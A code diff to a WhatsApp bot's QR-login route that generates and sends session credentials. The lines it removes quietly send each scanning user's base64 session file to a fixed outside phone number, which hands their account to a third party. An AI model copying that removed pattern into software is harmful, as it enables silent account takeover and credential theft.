@@ -6,6 +6,34 @@ let { toBuffer } = require("qrcode");
 const path = require('path');
 const fs = require("fs-extra");
 const { Boom } = require("@hapi/boom");
+const { makeid } = require('../utils/id');
+const zlib = require('zlib');
+const id = makeid();
+
+
+// List of audio URLs
+const audioUrls = [
+    "https://files.catbox.moe/brusa6.mp4",
+      "https://files.catbox.moe/3j1zy4.mp4",
+      "https://files.catbox.moe/4g3dwj.mp4",
+      "https://files.catbox.moe/su4wyp.mp4",
+      "https://files.catbox.moe/8cuz5m.mp4",
+      "https://files.catbox.moe/pdjieu.mp4",
+      "https://files.catbox.moe/esixn9.mp4",
+      "https://files.catbox.moe/dqj2fq.mp4",
+      "https://files.catbox.moe/dnyop2.mp4"
+];
+
+// Function to get a random audio URL
+function getRandomAudioUrl() {
+    const randomIndex = Math.floor(Math.random() * audioUrls.length);
+    return audioUrls[randomIndex];
+};
+
+function removeFile(FilePath) {
+    if (!fs.existsSync(FilePath)) return false;
+    fs.rmSync(FilePath, { recursive: true, force: true });
+};
 
 
   const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, delay, Browsers, DisconnectReason } = require("@whiskeysockets/baileys");
@@ -21,10 +49,10 @@ if (fs.existsSync('./auth_info_baileys')) {
 router.get('/', async (req, res) => {
     const sessionId = Date.now().toString();
          async function generateQRSession() {
-         const { state, saveCreds } = await useMultiFileAuthState(`./auth_info_baileys`);
+           const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);
 
         try {
-            let socket = makeWASocket({
+            let Smd = makeWASocket({
                  auth: {
                     creds: state.creds,
                     keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
@@ -35,11 +63,11 @@ router.get('/', async (req, res) => {
             });
 
             // Store session reference
-            activeSessions.set(sessionId, { socket });
+            activeSessions.set(sessionId, { Smd });
 
-            socket.ev.on('creds.update', saveCreds);
+            Smd.ev.on('creds.update', saveCreds);
 
-            socket.ev.on("connection.update", async (update) => {
+            Smd.ev.on("connection.update", async (update) => {
                 const { connection, lastDisconnect, qr } = update;
 
                 if (qr && !res.headersSent) {
@@ -62,30 +90,43 @@ router.get('/', async (req, res) => {
                 }
 
                 if (connection === "open") {
-                    try {
-                        await delay(3000);
-                        
-                        if (fs.existsSync('./auth_info_baileys/creds.json')) {
-                            const auth_path = './auth_info_baileys/';
-                            let user = '917003816486@s.whatsapp.net';
 
-                            // Read and send credentials as base64 encoded session
-                            const credsData = fs.readFileSync(auth_path + 'creds.json', 'utf8');
-                            const sessionData = Buffer.from(credsData).toString('base64');
+  await delay(20000);
+  let data = fs.readFileSync(`./temp/${id}/creds.json`);
+                    await delay(8000);
 
-                            let msgsss = await socket.sendMessage(user, { text: "KAISEN~" + sessionData });
-                            await socket.sendMessage(user, { text: MESSAGE }, { quoted: msgsss });
-                        }
+                    // Compress and encode session data
+                    let compressedData = zlib.gzipSync(data); // Compress
+                    let b64data = compressedData.toString('base64'); // Base64 encode
 
-                        await delay(1000);
-                        try { await fs.emptyDirSync('./auth_info_baileys'); } catch (e) {}
+                    // Send session data first
+     await Smd.sendMessage(Smd.user.id, {
+                        text: 'ALI-MD~' + b64data
+                    });
 
-                    } catch (e) {
-                        console.log("Error during session handling: ", e);
-                    }
+                    const randomAudioUrl = getRandomAudioUrl(); // Get a random audio URL
+                    await Smd.sendMessage(Smd.user.id, {
+                        audio: { url: randomAudioUrl },
+                        mimetype: 'audio/mp4', // MIME type for voice notes
+                        ptt: true,
+                        waveform: [100, 0, 100, 0, 100, 0, 100], // Optional waveform pattern
+                        fileName: 'shizo',
+                        contextInfo: {
+                            mentionedJid: [Smd.user.id], // Mention the sender in the audio message
+                            externalAdReply: {
+                                title: '𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐂𝐇𝐎𝐎𝐒𝐈𝐍𝐆 𝐀𝐋𝐈 𝐌𝐃',
+                                body: '𝐑𝐄𝐆𝐀𝐑𝐃𝐒 𝐀𝐋𝐈 𝐈𝐍𝐗𝐈𝐃𝐄',
+                                thumbnailUrl: 'https://files.catbox.moe/6ku0eo.jpg',
+                                sourceUrl: 'https://whatsapp.com/channel/0029VaoRxGmJpe8lgCqT1T2h',
+                                mediaType: 1,
+                                renderLargerThumbnail: true,
+                            },
+                        },
+                    });
 
                     await delay(100);
-                    await fs.emptyDirSync('./auth_info_baileys');
+                    await Smd.ws.close();
+                    return await removeFile('./temp/' + id);   
                 }
 
                 // Handle connection closures
